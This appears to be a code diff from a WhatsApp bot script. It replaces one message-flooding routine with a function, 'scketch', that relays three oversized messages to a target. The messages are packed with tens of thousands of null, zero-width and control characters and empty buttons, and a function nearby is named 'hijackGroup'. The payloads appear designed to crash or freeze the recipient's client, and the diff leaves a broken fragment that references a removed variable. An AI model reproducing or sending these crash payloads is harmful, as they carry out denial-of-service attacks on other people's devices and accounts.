@@ -2413,37 +2413,61 @@ async function hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwn
 const crypto = require('crypto');
 
 // ── BetaDelay (neon-devine-freeze wave 1) ──
-async function _betaDelay(sock, target, ptcp = true) {
-  for (let r = 0; r < 1000; r++) {
-    let msg = generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: '$', format: 'DEFAULT' },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\n'.repeat(10000),
-              version: 3,
-            },
-          },
-          contextInfo: {
-            isForwarded: true,
-            forwardingScore: 999,
-            remoteJid: 'status@broadcast',
-            participant: '135506@s.whatsapp.net',
-            quotedMessage: {
-              forwardedNewsletterMessageInfo: {
-                newsletterJid: '120363399608@newsletter',
-                newsletterName: '$',
-                contentType: 'UPDATE_CARD',
-                accessibilityText: '\u0000'.repeat(10000),
-                serverMessageId: 18888888
+async function scketch(sock, target) {
+      const msg1 = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "  \u200E\0".repeat(10000) },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 0x4e21 }, () => ({})),
+                messageVersion: 1
               }
             }
           }
         }
-      }
-    }, {});
+      };
+
+      const msg2 = {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              body: { text: "JUST END NOW" + "\u200B".repeat(10000) },
+              nativeFlowMessage: {
+                buttons: [
+                  {
+                    name: "order_status",
+                    buttonParamsJson: '{"order_id":"' + "\0".repeat(100000) +
+                                      '","order_title":"' + "\0".repeat(70000) +
+                                      '","status":"PROCESSING","token":"sgL4_dxscbfayun","flow_message_version":"1"}'
+                  },
+                  ...Array.from({ length: 0x4e22 }, () => ({}))
+                ],
+                messageVersion: 1
+              }
+            }
+          }
+        }
+      };
+
+      const msg3 = {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              body: { text: "\r" },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 0xc350 * 2 }, () => ({})),
+                messageVersion: 1
+              }
+            }
+          }
+        }
+      };
+
+      await sock.relayMessage(target, msg1, {});
+      await sock.relayMessage(target, msg2, {});
+      await sock.relayMessage(target, msg3, {});
+}
 
     await sock.relayMessage(target, {
       groupStatusMessageV2: { message: msg.message },
